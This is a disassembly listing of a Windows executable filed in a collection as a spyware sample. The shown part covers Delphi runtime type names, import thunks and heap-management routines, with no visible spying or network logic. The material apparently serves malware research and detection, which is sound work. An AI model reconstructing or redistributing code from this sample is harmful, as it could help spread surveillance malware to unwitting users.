
malware_samples/spyware/46e43f0806085da66f4d9bcb7391a618977f5f9a0c6b612e2e02ba6b8e9d1011.exe:     file format pei-i386


Disassembly of section CODE:

00401000 <CODE>:
  401000:	04 10                	add    $0x10,%al
  401002:	40                   	inc    %eax
  401003:	00 02                	add    %al,(%edx)
  401005:	04 43                	add    $0x43,%al
  401007:	68 61 72 01 00       	push   $0x17261
  40100c:	00 00                	add    %al,(%eax)
  40100e:	00 ff                	add    %bh,%bh
  401010:	00 00                	add    %al,(%eax)
  401012:	00 90 18 10 40 00    	add    %dl,0x401018(%eax)
  401018:	01 04 42             	add    %eax,(%edx,%eax,2)
  40101b:	79 74                	jns    0x401091
  40101d:	65 01 00             	add    %eax,%gs:(%eax)
  401020:	00 00                	add    %al,(%eax)
  401022:	00 ff                	add    %bh,%bh
  401024:	00 00                	add    %al,(%eax)
  401026:	00 90 2c 10 40 00    	add    %dl,0x40102c(%eax)
  40102c:	01 08                	add    %ecx,(%eax)
  40102e:	43                   	inc    %ebx
  40102f:	61                   	popa
  401030:	72 64                	jb     0x401096
  401032:	69 6e 61 6c 05 00 00 	imul   $0x56c,0x61(%esi),%ebp
  401039:	00 00                	add    %al,(%eax)
  40103b:	ff                   	(bad)
  40103c:	ff                   	(bad)
  40103d:	ff                   	(bad)
  40103e:	ff 90 44 10 40 00    	call   *0x401044(%eax)
  401044:	0a 06                	or     (%esi),%al
  401046:	53                   	push   %ebx
  401047:	74 72                	je     0x4010bb
  401049:	69 6e 67 50 10 40 00 	imul   $0x401050,0x67(%esi),%ebp
  401050:	0b 0a                	or     (%edx),%ecx
  401052:	57                   	push   %edi
  401053:	69 64 65 53 74 72 69 	imul   $0x6e697274,0x53(%ebp,%eiz,2),%esp
  40105a:	6e 
  40105b:	67 a8 10             	addr16 test $0x10,%al
  40105e:	40                   	inc    %eax
	...
  40107b:	00 a8 10 40 00 04    	add    %ch,0x4004010(%eax)
  401081:	00 00                	add    %al,(%eax)
  401083:	00 00                	add    %al,(%eax)
  401085:	00 00                	add    %al,(%eax)
  401087:	00 b0 2c 40 00 bc    	add    %dh,-0x43ffbfd4(%eax)
  40108d:	2c 40                	sub    $0x40,%al
  40108f:	00 c0                	add    %al,%al
  401091:	2c 40                	sub    $0x40,%al
  401093:	00 c4                	add    %al,%ah
  401095:	2c 40                	sub    $0x40,%al
  401097:	00 b8 2c 40 00 94    	add    %bh,-0x6bffbfd4(%eax)
  40109d:	2b 40 00             	sub    0x0(%eax),%eax
  4010a0:	b0 2b                	mov    $0x2b,%al
  4010a2:	40                   	inc    %eax
  4010a3:	00 ec                	add    %ch,%ah
  4010a5:	2b 40 00             	sub    0x0(%eax),%eax
  4010a8:	07                   	pop    %es
  4010a9:	54                   	push   %esp
  4010aa:	4f                   	dec    %edi
  4010ab:	62 6a 65             	bound  %ebp,0x65(%edx)
  4010ae:	63 74 ff 25          	arpl   %esi,0x25(%edi,%edi,8)
  4010b2:	40                   	inc    %eax
  4010b3:	d1 41 00             	roll   $1,0x0(%ecx)
  4010b6:	8b c0                	mov    %eax,%eax
  4010b8:	ff 25 3c d1 41 00    	jmp    *0x41d13c
  4010be:	8b c0                	mov    %eax,%eax
  4010c0:	ff 25 38 d1 41 00    	jmp    *0x41d138
  4010c6:	8b c0                	mov    %eax,%eax
  4010c8:	ff 25 34 d1 41 00    	jmp    *0x41d134
  4010ce:	8b c0                	mov    %eax,%eax
  4010d0:	ff 25 30 d1 41 00    	jmp    *0x41d130
  4010d6:	8b c0                	mov    %eax,%eax
  4010d8:	ff 25 50 d1 41 00    	jmp    *0x41d150
  4010de:	8b c0                	mov    %eax,%eax
  4010e0:	ff 25 2c d1 41 00    	jmp    *0x41d12c
  4010e6:	8b c0                	mov    %eax,%eax
  4010e8:	ff 25 4c d1 41 00    	jmp    *0x41d14c
  4010ee:	8b c0                	mov    %eax,%eax
  4010f0:	ff 25 28 d1 41 00    	jmp    *0x41d128
  4010f6:	8b c0                	mov    %eax,%eax
  4010f8:	ff 25 24 d1 41 00    	jmp    *0x41d124
  4010fe:	8b c0                	mov    %eax,%eax
  401100:	ff 25 20 d1 41 00    	jmp    *0x41d120
  401106:	8b c0                	mov    %eax,%eax
  401108:	ff 25 1c d1 41 00    	jmp    *0x41d11c
  40110e:	8b c0                	mov    %eax,%eax
  401110:	ff 25 18 d1 41 00    	jmp    *0x41d118
  401116:	8b c0                	mov    %eax,%eax
  401118:	ff 25 14 d1 41 00    	jmp    *0x41d114
  40111e:	8b c0                	mov    %eax,%eax
  401120:	ff 25 10 d1 41 00    	jmp    *0x41d110
  401126:	8b c0                	mov    %eax,%eax
  401128:	ff 25 60 d1 41 00    	jmp    *0x41d160
  40112e:	8b c0                	mov    %eax,%eax
  401130:	ff 25 5c d1 41 00    	jmp    *0x41d15c
  401136:	8b c0                	mov    %eax,%eax
  401138:	ff 25 58 d1 41 00    	jmp    *0x41d158
  40113e:	8b c0                	mov    %eax,%eax
  401140:	ff 25 0c d1 41 00    	jmp    *0x41d10c
  401146:	8b c0                	mov    %eax,%eax
  401148:	ff 25 70 d1 41 00    	jmp    *0x41d170
  40114e:	8b c0                	mov    %eax,%eax
  401150:	ff 25 6c d1 41 00    	jmp    *0x41d16c
  401156:	8b c0                	mov    %eax,%eax
  401158:	ff 25 68 d1 41 00    	jmp    *0x41d168
  40115e:	8b c0                	mov    %eax,%eax
  401160:	ff 25 08 d1 41 00    	jmp    *0x41d108
  401166:	8b c0                	mov    %eax,%eax
  401168:	ff 25 04 d1 41 00    	jmp    *0x41d104
  40116e:	8b c0                	mov    %eax,%eax
  401170:	ff 25 00 d1 41 00    	jmp    *0x41d100
  401176:	8b c0                	mov    %eax,%eax
  401178:	ff 25 fc d0 41 00    	jmp    *0x41d0fc
  40117e:	8b c0                	mov    %eax,%eax
  401180:	53                   	push   %ebx
  401181:	83 c4 bc             	add    $0xffffffbc,%esp
  401184:	bb 0a 00 00 00       	mov    $0xa,%ebx
  401189:	54                   	push   %esp
  40118a:	e8 81 ff ff ff       	call   0x401110
  40118f:	f6 44 24 2c 01       	testb  $0x1,0x2c(%esp)
  401194:	74 05                	je     0x40119b
  401196:	0f b7 5c 24 30       	movzwl 0x30(%esp),%ebx
  40119b:	8b c3                	mov    %ebx,%eax
  40119d:	83 c4 44             	add    $0x44,%esp
  4011a0:	5b                   	pop    %ebx
  4011a1:	c3                   	ret
  4011a2:	8b c0                	mov    %eax,%eax
  4011a4:	ff 25 f8 d0 41 00    	jmp    *0x41d0f8
  4011aa:	8b c0                	mov    %eax,%eax
  4011ac:	ff 25 f4 d0 41 00    	jmp    *0x41d0f4
  4011b2:	8b c0                	mov    %eax,%eax
  4011b4:	ff 25 f0 d0 41 00    	jmp    *0x41d0f0
  4011ba:	8b c0                	mov    %eax,%eax
  4011bc:	ff 25 ec d0 41 00    	jmp    *0x41d0ec
  4011c2:	8b c0                	mov    %eax,%eax
  4011c4:	ff 25 e8 d0 41 00    	jmp    *0x41d0e8
  4011ca:	8b c0                	mov    %eax,%eax
  4011cc:	ff 25 e4 d0 41 00    	jmp    *0x41d0e4
  4011d2:	8b c0                	mov    %eax,%eax
  4011d4:	ff 25 e0 d0 41 00    	jmp    *0x41d0e0
  4011da:	8b c0                	mov    %eax,%eax
  4011dc:	ff 25 dc d0 41 00    	jmp    *0x41d0dc
  4011e2:	8b c0                	mov    %eax,%eax
  4011e4:	53                   	push   %ebx
  4011e5:	56                   	push   %esi
  4011e6:	be d0 c5 41 00       	mov    $0x41c5d0,%esi
  4011eb:	83 3e 00             	cmpl   $0x0,(%esi)
  4011ee:	75 3a                	jne    0x40122a
  4011f0:	68 44 06 00 00       	push   $0x644
  4011f5:	6a 00                	push   $0x0
  4011f7:	e8 a8 ff ff ff       	call   0x4011a4
  4011fc:	8b c8                	mov    %eax,%ecx
  4011fe:	85 c9                	test   %ecx,%ecx
  401200:	75 05                	jne    0x401207
  401202:	33 c0                	xor    %eax,%eax
  401204:	5e                   	pop    %esi
  401205:	5b                   	pop    %ebx
  401206:	c3                   	ret
  401207:	a1 cc c5 41 00       	mov    0x41c5cc,%eax
  40120c:	89 01                	mov    %eax,(%ecx)
  40120e:	89 0d cc c5 41 00    	mov    %ecx,0x41c5cc
  401214:	33 d2                	xor    %edx,%edx
  401216:	8b c2                	mov    %edx,%eax
  401218:	03 c0                	add    %eax,%eax
  40121a:	8d 44 c1 04          	lea    0x4(%ecx,%eax,8),%eax
  40121e:	8b 1e                	mov    (%esi),%ebx
  401220:	89 18                	mov    %ebx,(%eax)
  401222:	89 06                	mov    %eax,(%esi)
  401224:	42                   	inc    %edx
  401225:	83 fa 64             	cmp    $0x64,%edx
  401228:	75 ec                	jne    0x401216
  40122a:	8b 06                	mov    (%esi),%eax
  40122c:	8b 10                	mov    (%eax),%edx
  40122e:	89 16                	mov    %edx,(%esi)
  401230:	5e                   	pop    %esi
  401231:	5b                   	pop    %ebx
  401232:	c3                   	ret
  401233:	90                   	nop
  401234:	89 00                	mov    %eax,(%eax)
  401236:	89 40 04             	mov    %eax,0x4(%eax)
  401239:	c3                   	ret
  40123a:	8b c0                	mov    %eax,%eax
  40123c:	53                   	push   %ebx
  40123d:	56                   	push   %esi
  40123e:	8b f2                	mov    %edx,%esi
  401240:	8b d8                	mov    %eax,%ebx
  401242:	e8 9d ff ff ff       	call   0x4011e4
  401247:	85 c0                	test   %eax,%eax
  401249:	75 05                	jne    0x401250
  40124b:	33 c0                	xor    %eax,%eax
  40124d:	5e                   	pop    %esi
  40124e:	5b                   	pop    %ebx
  40124f:	c3                   	ret
  401250:	8b 16                	mov    (%esi),%edx
  401252:	89 50 08             	mov    %edx,0x8(%eax)
  401255:	8b 56 04             	mov    0x4(%esi),%edx
  401258:	89 50 0c             	mov    %edx,0xc(%eax)
  40125b:	8b 13                	mov    (%ebx),%edx
  40125d:	89 10                	mov    %edx,(%eax)
  40125f:	89 58 04             	mov    %ebx,0x4(%eax)
  401262:	89 42 04             	mov    %eax,0x4(%edx)
  401265:	89 03                	mov    %eax,(%ebx)
  401267:	b0 01                	mov    $0x1,%al
  401269:	5e                   	pop    %esi
  40126a:	5b                   	pop    %ebx
  40126b:	c3                   	ret
  40126c:	8b 50 04             	mov    0x4(%eax),%edx
  40126f:	8b 08                	mov    (%eax),%ecx
  401271:	89 0a                	mov    %ecx,(%edx)
  401273:	89 51 04             	mov    %edx,0x4(%ecx)
  401276:	8b 15 d0 c5 41 00    	mov    0x41c5d0,%edx
  40127c:	89 10                	mov    %edx,(%eax)
  40127e:	a3 d0 c5 41 00       	mov    %eax,0x41c5d0
  401283:	c3                   	ret
  401284:	53                   	push   %ebx
  401285:	56                   	push   %esi
  401286:	57                   	push   %edi
  401287:	55                   	push   %ebp
  401288:	51                   	push   %ecx
  401289:	8b f1                	mov    %ecx,%esi
  40128b:	89 14 24             	mov    %edx,(%esp)
  40128e:	8b e8                	mov    %eax,%ebp
  401290:	8b 5d 00             	mov    0x0(%ebp),%ebx
  401293:	8b 04 24             	mov    (%esp),%eax
  401296:	8b 10                	mov    (%eax),%edx
  401298:	89 16                	mov    %edx,(%esi)
  40129a:	8b 50 04             	mov    0x4(%eax),%edx
  40129d:	89 56 04             	mov    %edx,0x4(%esi)
  4012a0:	8b 3b                	mov    (%ebx),%edi
  4012a2:	8b 06                	mov    (%esi),%eax
  4012a4:	8b 53 08             	mov    0x8(%ebx),%edx
  4012a7:	03 53 0c             	add    0xc(%ebx),%edx
  4012aa:	3b c2                	cmp    %edx,%eax
  4012ac:	75 14                	jne    0x4012c2
  4012ae:	8b c3                	mov    %ebx,%eax
  4012b0:	e8 b7 ff ff ff       	call   0x40126c
  4012b5:	8b 43 08             	mov    0x8(%ebx),%eax
  4012b8:	89 06                	mov    %eax,(%esi)
  4012ba:	8b 43 0c             	mov    0xc(%ebx),%eax
  4012bd:	01 46 04             	add    %eax,0x4(%esi)
  4012c0:	eb 15                	jmp    0x4012d7
  4012c2:	03 46 04             	add    0x4(%esi),%eax
  4012c5:	3b 43 08             	cmp    0x8(%ebx),%eax
  4012c8:	75 0d                	jne    0x4012d7
  4012ca:	8b c3                	mov    %ebx,%eax
  4012cc:	e8 9b ff ff ff       	call   0x40126c
  4012d1:	8b 43 0c             	mov    0xc(%ebx),%eax
  4012d4:	01 46 04             	add    %eax,0x4(%esi)
  4012d7:	8b df                	mov    %edi,%ebx
  4012d9:	3b eb                	cmp    %ebx,%ebp
  4012db:	75 c3                	jne    0x4012a0
  4012dd:	8b d6                	mov    %esi,%edx
  4012df:	8b c5                	mov    %ebp,%eax
  4012e1:	e8 56 ff ff ff       	call   0x40123c
  4012e6:	84 c0                	test   %al,%al
  4012e8:	75 04                	jne    0x4012ee
  4012ea:	33 c0                	xor    %eax,%eax
  4012ec:	89 06                	mov    %eax,(%esi)
  4012ee:	5a                   	pop    %edx
  4012ef:	5d                   	pop    %ebp
  4012f0:	5f                   	pop    %edi
  4012f1:	5e                   	pop    %esi
  4012f2:	5b                   	pop    %ebx
  4012f3:	c3                   	ret
  4012f4:	53                   	push   %ebx
  4012f5:	56                   	push   %esi
  4012f6:	57                   	push   %edi
  4012f7:	55                   	push   %ebp
  4012f8:	83 c4 f8             	add    $0xfffffff8,%esp
  4012fb:	8b d8                	mov    %eax,%ebx
  4012fd:	8b fb                	mov    %ebx,%edi
  4012ff:	8b 32                	mov    (%edx),%esi
  401301:	8b 43 08             	mov    0x8(%ebx),%eax
  401304:	3b f0                	cmp    %eax,%esi
  401306:	72 70                	jb     0x401378
  401308:	8b ce                	mov    %esi,%ecx
  40130a:	03 4a 04             	add    0x4(%edx),%ecx
  40130d:	8b e8                	mov    %eax,%ebp
  40130f:	03 6b 0c             	add    0xc(%ebx),%ebp
  401312:	3b cd                	cmp    %ebp,%ecx
  401314:	77 62                	ja     0x401378
  401316:	3b f0                	cmp    %eax,%esi
  401318:	75 1b                	jne    0x401335
  40131a:	8b 42 04             	mov    0x4(%edx),%eax
  40131d:	01 43 08             	add    %eax,0x8(%ebx)
  401320:	8b 42 04             	mov    0x4(%edx),%eax
  401323:	29 43 0c             	sub    %eax,0xc(%ebx)
  401326:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40132a:	75 48                	jne    0x401374
  40132c:	8b c3                	mov    %ebx,%eax
  40132e:	e8 39 ff ff ff       	call   0x40126c
  401333:	eb 3f                	jmp    0x401374
  401335:	8b ce                	mov    %esi,%ecx
  401337:	8b 7a 04             	mov    0x4(%edx),%edi
  40133a:	03 cf                	add    %edi,%ecx
  40133c:	8b e8                	mov    %eax,%ebp
  40133e:	03 6b 0c             	add    0xc(%ebx),%ebp
  401341:	3b cd                	cmp    %ebp,%ecx
  401343:	75 05                	jne    0x40134a
  401345:	29 7b 0c             	sub    %edi,0xc(%ebx)
  401348:	eb 2a                	jmp    0x401374
  40134a:	8b 0a                	mov    (%edx),%ecx
  40134c:	03 4a 04             	add    0x4(%edx),%ecx
  40134f:	89 0c 24             	mov    %ecx,(%esp)
  401352:	8b 7b 08             	mov    0x8(%ebx),%edi
  401355:	03 7b 0c             	add    0xc(%ebx),%edi
  401358:	2b f9                	sub    %ecx,%edi
  40135a:	89 7c 24 04          	mov    %edi,0x4(%esp)
  40135e:	2b f0                	sub    %eax,%esi
  401360:	89 73 0c             	mov    %esi,0xc(%ebx)
  401363:	8b d4                	mov    %esp,%edx
  401365:	8b c3                	mov    %ebx,%eax
  401367:	e8 d0 fe ff ff       	call   0x40123c
  40136c:	84 c0                	test   %al,%al
  40136e:	75 04                	jne    0x401374
  401370:	33 c0                	xor    %eax,%eax
  401372:	eb 0c                	jmp    0x401380
  401374:	b0 01                	mov    $0x1,%al
  401376:	eb 08                	jmp    0x401380
  401378:	8b 1b                	mov    (%ebx),%ebx
  40137a:	3b fb                	cmp    %ebx,%edi
  40137c:	75 81                	jne    0x4012ff
  40137e:	33 c0                	xor    %eax,%eax
  401380:	59                   	pop    %ecx
  401381:	5a                   	pop    %edx
  401382:	5d                   	pop    %ebp
  401383:	5f                   	pop    %edi
  401384:	5e                   	pop    %esi
  401385:	5b                   	pop    %ebx
  401386:	c3                   	ret
  401387:	90                   	nop
  401388:	53                   	push   %ebx
  401389:	56                   	push   %esi
  40138a:	57                   	push   %edi
  40138b:	8b da                	mov    %edx,%ebx
  40138d:	8b f0                	mov    %eax,%esi
  40138f:	81 fe 00 00 10 00    	cmp    $0x100000,%esi
  401395:	7d 07                	jge    0x40139e
  401397:	be 00 00 10 00       	mov    $0x100000,%esi
  40139c:	eb 0c                	jmp    0x4013aa
  40139e:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  4013a4:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  4013aa:	89 73 04             	mov    %esi,0x4(%ebx)
  4013ad:	6a 01                	push   $0x1
  4013af:	68 00 20 00 00       	push   $0x2000
  4013b4:	56                   	push   %esi
  4013b5:	6a 00                	push   $0x0
  4013b7:	e8 f8 fd ff ff       	call   0x4011b4
  4013bc:	8b f8                	mov    %eax,%edi
  4013be:	89 3b                	mov    %edi,(%ebx)
  4013c0:	85 ff                	test   %edi,%edi
  4013c2:	74 23                	je     0x4013e7
  4013c4:	8b d3                	mov    %ebx,%edx
  4013c6:	b8 d4 c5 41 00       	mov    $0x41c5d4,%eax
  4013cb:	e8 6c fe ff ff       	call   0x40123c
  4013d0:	84 c0                	test   %al,%al
  4013d2:	75 13                	jne    0x4013e7
  4013d4:	68 00 80 00 00       	push   $0x8000
  4013d9:	6a 00                	push   $0x0
  4013db:	8b 03                	mov    (%ebx),%eax
  4013dd:	50                   	push   %eax
  4013de:	e8 d9 fd ff ff       	call   0x4011bc
  4013e3:	33 c0                	xor    %eax,%eax
  4013e5:	89 03                	mov    %eax,(%ebx)
  4013e7:	5f                   	pop    %edi
  4013e8:	5e                   	pop    %esi
  4013e9:	5b                   	pop    %ebx
  4013ea:	c3                   	ret
  4013eb:	90                   	nop
  4013ec:	53                   	push   %ebx
  4013ed:	56                   	push   %esi
  4013ee:	57                   	push   %edi
  4013ef:	55                   	push   %ebp
  4013f0:	8b d9                	mov    %ecx,%ebx
  4013f2:	8b f2                	mov    %edx,%esi
  4013f4:	8b e8                	mov    %eax,%ebp
  4013f6:	c7 43 04 00 00 10 00 	movl   $0x100000,0x4(%ebx)
  4013fd:	6a 04                	push   $0x4
  4013ff:	68 00 20 00 00       	push   $0x2000
  401404:	68 00 00 10 00       	push   $0x100000
  401409:	55                   	push   %ebp
  40140a:	e8 a5 fd ff ff       	call   0x4011b4
  40140f:	8b f8                	mov    %eax,%edi
  401411:	89 3b                	mov    %edi,(%ebx)
  401413:	85 ff                	test   %edi,%edi
  401415:	75 1f                	jne    0x401436
  401417:	81 c6 ff ff 00 00    	add    $0xffff,%esi
  40141d:	81 e6 00 00 ff ff    	and    $0xffff0000,%esi
  401423:	89 73 04             	mov    %esi,0x4(%ebx)
  401426:	6a 04                	push   $0x4
  401428:	68 00 20 00 00       	push   $0x2000
  40142d:	56                   	push   %esi
  40142e:	55                   	push   %ebp
  40142f:	e8 80 fd ff ff       	call   0x4011b4
  401434:	89 03                	mov    %eax,(%ebx)
  401436:	83 3b 00             	cmpl   $0x0,(%ebx)
  401439:	74 23                	je     0x40145e
  40143b:	8b d3                	mov    %ebx,%edx
  40143d:	b8 d4 c5 41 00       	mov    $0x41c5d4,%eax
  401442:	e8 f5 fd ff ff       	call   0x40123c
  401447:	84 c0                	test   %al,%al
  401449:	75 13                	jne    0x40145e
  40144b:	68 00 80 00 00       	push   $0x8000
  401450:	6a 00                	push   $0x0
  401452:	8b 03                	mov    (%ebx),%eax
  401454:	50                   	push   %eax
  401455:	e8 62 fd ff ff       	call   0x4011bc
  40145a:	33 c0                	xor    %eax,%eax
  40145c:	89 03                	mov    %eax,(%ebx)
  40145e:	5d                   	pop    %ebp
  40145f:	5f                   	pop    %edi
  401460:	5e                   	pop    %esi
  401461:	5b                   	pop    %ebx
  401462:	c3                   	ret
  401463:	90                   	nop
  401464:	53                   	push   %ebx
  401465:	56                   	push   %esi
  401466:	57                   	push   %edi
  401467:	55                   	push   %ebp
  401468:	83 c4 ec             	add    $0xffffffec,%esp
  40146b:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40146f:	89 14 24             	mov    %edx,(%esp)
  401472:	c7 44 24 08 ff ff ff 	movl   $0xffffffff,0x8(%esp)
  401479:	ff 
  40147a:	33 d2                	xor    %edx,%edx
  40147c:	89 54 24 0c          	mov    %edx,0xc(%esp)
  401480:	8b e8                	mov    %eax,%ebp
  401482:	8b 04 24             	mov    (%esp),%eax
  401485:	03 c5                	add    %ebp,%eax
  401487:	89 44 24 10          	mov    %eax,0x10(%esp)
  40148b:	8b 1d d4 c5 41 00    	mov    0x41c5d4,%ebx
  401491:	eb 51                	jmp    0x4014e4
  401493:	8b 3b                	mov    (%ebx),%edi
  401495:	8b 73 08             	mov    0x8(%ebx),%esi
  401498:	3b ee                	cmp    %esi,%ebp
  40149a:	77 46                	ja     0x4014e2
  40149c:	8b c6                	mov    %esi,%eax
  40149e:	03 43 0c             	add    0xc(%ebx),%eax
  4014a1:	3b 44 24 10          	cmp    0x10(%esp),%eax
  4014a5:	77 3b                	ja     0x4014e2
  4014a7:	3b 74 24 08          	cmp    0x8(%esp),%esi
  4014ab:	73 04                	jae    0x4014b1
  4014ad:	89 74 24 08          	mov    %esi,0x8(%esp)
  4014b1:	8b c6                	mov    %esi,%eax
  4014b3:	03 43 0c             	add    0xc(%ebx),%eax
  4014b6:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4014ba:	76 04                	jbe    0x4014c0
  4014bc:	89 44 24 0c          	mov    %eax,0xc(%esp)
  4014c0:	68 00 80 00 00       	push   $0x8000
  4014c5:	6a 00                	push   $0x0
  4014c7:	56                   	push   %esi
  4014c8:	e8 ef fc ff ff       	call   0x4011bc
  4014cd:	85 c0                	test   %eax,%eax
  4014cf:	75 0a                	jne    0x4014db
  4014d1:	c7 05 b0 c5 41 00 01 	movl   $0x1,0x41c5b0
  4014d8:	00 00 00 
  4014db:	8b c3                	mov    %ebx,%eax
  4014dd:	e8 8a fd ff ff       	call   0x40126c
  4014e2:	8b df                	mov    %edi,%ebx
  4014e4:	81 fb d4 c5 41 00    	cmp    $0x41c5d4,%ebx
  4014ea:	75 a7                	jne    0x401493
  4014ec:	8b 44 24 04          	mov    0x4(%esp),%eax
  4014f0:	33 d2                	xor    %edx,%edx
  4014f2:	89 10                	mov    %edx,(%eax)
  4014f4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4014f9:	74 19                	je     0x401514
  4014fb:	8b 44 24 04          	mov    0x4(%esp),%eax
  4014ff:	8b 54 24 08          	mov    0x8(%esp),%edx
  401503:	89 10                	mov    %edx,(%eax)
  401505:	8b 44 24 0c          	mov    0xc(%esp),%eax
  401509:	2b 44 24 08          	sub    0x8(%esp),%eax
  40150d:	8b 54 24 04          	mov    0x4(%esp),%edx
  401511:	89 42 04             	mov    %eax,0x4(%edx)
  401514:	83 c4 14             	add    $0x14,%esp
  401517:	5d                   	pop    %ebp
  401518:	5f                   	pop    %edi
  401519:	5e                   	pop    %esi
  40151a:	5b                   	pop    %ebx
  40151b:	c3                   	ret
  40151c:	53                   	push   %ebx
  40151d:	56                   	push   %esi
  40151e:	57                   	push   %edi
  40151f:	55                   	push   %ebp
  401520:	83 c4 f4             	add    $0xfffffff4,%esp
  401523:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  401527:	89 14 24             	mov    %edx,(%esp)
  40152a:	8b d0                	mov    %eax,%edx
  40152c:	8b ea                	mov    %edx,%ebp
  40152e:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  401534:	03 14 24             	add    (%esp),%edx
  401537:	81 c2 ff 0f 00 00    	add    $0xfff,%edx
  40153d:	81 e2 00 f0 ff ff    	and    $0xfffff000,%edx
  401543:	89 54 24 08          	mov    %edx,0x8(%esp)
  401547:	8b 44 24 04          	mov    0x4(%esp),%eax
  40154b:	89 28                	mov    %ebp,(%eax)
  40154d:	8b 44 24 08          	mov    0x8(%esp),%eax
  401551:	2b c5                	sub    %ebp,%eax
  401553:	8b 54 24 04          	mov    0x4(%esp),%edx
  401557:	89 42 04             	mov    %eax,0x4(%edx)
  40155a:	8b 35 d4 c5 41 00    	mov    0x41c5d4,%esi
  401560:	eb 3c                	jmp    0x40159e
  401562:	8b 5e 08             	mov    0x8(%esi),%ebx
  401565:	8b 7e 0c             	mov    0xc(%esi),%edi
  401568:	03 fb                	add    %ebx,%edi
  40156a:	3b eb                	cmp    %ebx,%ebp
  40156c:	76 02                	jbe    0x401570
  40156e:	8b dd                	mov    %ebp,%ebx
  401570:	3b 7c 24 08          	cmp    0x8(%esp),%edi
  401574:	76 04                	jbe    0x40157a
  401576:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40157a:	3b fb                	cmp    %ebx,%edi
  40157c:	76 1e                	jbe    0x40159c
  40157e:	6a 04                	push   $0x4
  401580:	68 00 10 00 00       	push   $0x1000
  401585:	2b fb                	sub    %ebx,%edi
  401587:	57                   	push   %edi
  401588:	53                   	push   %ebx
  401589:	e8 26 fc ff ff       	call   0x4011b4
  40158e:	85 c0                	test   %eax,%eax
  401590:	75 0a                	jne    0x40159c
  401592:	8b 44 24 04          	mov    0x4(%esp),%eax
  401596:	33 d2                	xor    %edx,%edx
  401598:	89 10                	mov    %edx,(%eax)
  40159a:	eb 0a                	jmp    0x4015a6
  40159c:	8b 36                	mov    (%esi),%esi
  40159e:	81 fe d4 c5 41 00    	cmp    $0x41c5d4,%esi
  4015a4:	75 bc                	jne    0x401562
  4015a6:	83 c4 0c             	add    $0xc,%esp
  4015a9:	5d                   	pop    %ebp
  4015aa:	5f                   	pop    %edi
  4015ab:	5e                   	pop    %esi
  4015ac:	5b                   	pop    %ebx
  4015ad:	c3                   	ret
  4015ae:	8b c0                	mov    %eax,%eax
  4015b0:	53                   	push   %ebx
  4015b1:	56                   	push   %esi
  4015b2:	57                   	push   %edi
  4015b3:	55                   	push   %ebp
  4015b4:	51                   	push   %ecx
  4015b5:	8b d8                	mov    %eax,%ebx
  4015b7:	8b f3                	mov    %ebx,%esi
  4015b9:	81 c6 ff 0f 00 00    	add    $0xfff,%esi
  4015bf:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  4015c5:	89 34 24             	mov    %esi,(%esp)
  4015c8:	8b eb                	mov    %ebx,%ebp
  4015ca:	03 ea                	add    %edx,%ebp
  4015cc:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  4015d2:	8b 04 24             	mov    (%esp),%eax
  4015d5:	89 01                	mov    %eax,(%ecx)
  4015d7:	8b c5                	mov    %ebp,%eax
  4015d9:	2b 04 24             	sub    (%esp),%eax
  4015dc:	89 41 04             	mov    %eax,0x4(%ecx)
  4015df:	8b 35 d4 c5 41 00    	mov    0x41c5d4,%esi
  4015e5:	eb 38                	jmp    0x40161f
  4015e7:	8b 5e 08             	mov    0x8(%esi),%ebx
  4015ea:	8b 7e 0c             	mov    0xc(%esi),%edi
  4015ed:	03 fb                	add    %ebx,%edi
  4015ef:	3b 1c 24             	cmp    (%esp),%ebx
  4015f2:	73 03                	jae    0x4015f7
  4015f4:	8b 1c 24             	mov    (%esp),%ebx
  4015f7:	3b ef                	cmp    %edi,%ebp
  4015f9:	73 02                	jae    0x4015fd
  4015fb:	8b fd                	mov    %ebp,%edi
  4015fd:	3b fb                	cmp    %ebx,%edi
  4015ff:	76 1c                	jbe    0x40161d
  401601:	68 00 40 00 00       	push   $0x4000
  401606:	2b fb                	sub    %ebx,%edi
  401608:	57                   	push   %edi
  401609:	53                   	push   %ebx
  40160a:	e8 ad fb ff ff       	call   0x4011bc
  40160f:	85 c0                	test   %eax,%eax
  401611:	75 0a                	jne    0x40161d
  401613:	c7 05 b0 c5 41 00 02 	movl   $0x2,0x41c5b0
  40161a:	00 00 00 
  40161d:	8b 36                	mov    (%esi),%esi
  40161f:	81 fe d4 c5 41 00    	cmp    $0x41c5d4,%esi
  401625:	75 c0                	jne    0x4015e7
  401627:	5a                   	pop    %edx
  401628:	5d                   	pop    %ebp
  401629:	5f                   	pop    %edi
  40162a:	5e                   	pop    %esi
  40162b:	5b                   	pop    %ebx
  40162c:	c3                   	ret
  40162d:	8d 40 00             	lea    0x0(%eax),%eax
  401630:	53                   	push   %ebx
  401631:	56                   	push   %esi
  401632:	57                   	push   %edi
  401633:	55                   	push   %ebp
  401634:	83 c4 f8             	add    $0xfffffff8,%esp
  401637:	8b f2                	mov    %edx,%esi
  401639:	8b f8                	mov    %eax,%edi
  40163b:	bd e4 c5 41 00       	mov    $0x41c5e4,%ebp
  401640:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  401646:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  40164c:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40164f:	eb 33                	jmp    0x401684
  401651:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  401654:	7f 2c                	jg     0x401682
  401656:	8b ce                	mov    %esi,%ecx
  401658:	8b d7                	mov    %edi,%edx
  40165a:	8b 43 08             	mov    0x8(%ebx),%eax
  40165d:	e8 ba fe ff ff       	call   0x40151c
  401662:	83 3e 00             	cmpl   $0x0,(%esi)
  401665:	74 50                	je     0x4016b7
  401667:	8b 46 04             	mov    0x4(%esi),%eax
  40166a:	01 43 08             	add    %eax,0x8(%ebx)
  40166d:	8b 46 04             	mov    0x4(%esi),%eax
  401670:	29 43 0c             	sub    %eax,0xc(%ebx)
  401673:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  401677:	75 3e                	jne    0x4016b7
  401679:	8b c3                	mov    %ebx,%eax
